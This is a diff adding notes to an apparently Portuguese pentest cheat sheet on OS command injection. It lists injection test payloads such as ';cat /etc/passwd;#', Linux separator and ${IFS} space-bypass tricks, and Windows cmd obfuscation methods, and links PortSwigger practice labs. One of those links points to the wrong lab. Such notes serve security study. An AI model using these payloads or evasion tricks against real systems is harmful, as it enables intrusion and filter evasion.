@@ -4498,6 +4498,40 @@ Chuta os char da database um por um
 
 Identificar na aplicação a possibilidade de injetar comandos depois de entender o funcionamento da aplicação, um dos testes a se fazer é `;ls;#` ponto e vírgula serve para finalizar o comando e iniciar outro e o `#` serve para ignorar o que vier depois ou `;cat /etc/passwd;#`
 
+Bypass
+Linux Separadores de comandos
+
+    ;
+    0x0a ou \n
+
+Linux comandos inline `comando`
+    
+	$(comando)
+
+Linux comandos inline (Bypass de espaço) `${IFS}`
+
+    ping 127.0.0.1${IFS};id
+
+
+Windows Tricks
+
+    ^d^i^r -> dir
+    n^e^t u^s^e^r -> net user
+    set a=/c & set b=calc
+    cmd %a% %b% -> cmd /c calc
+    c""m"d" -> cmd
+    c:\programdata -> Pega o c através
+    %programdata:~0,1%md -> cmd
+
+[OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
+
+[Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
+
+[Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
+
+[Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
+
+
 - Prototype Pollution
 
 Alguns payloads que podem ser inseridos nos campos login e senha com o intuito de explorar a vulnerabilidade de protorype pollution
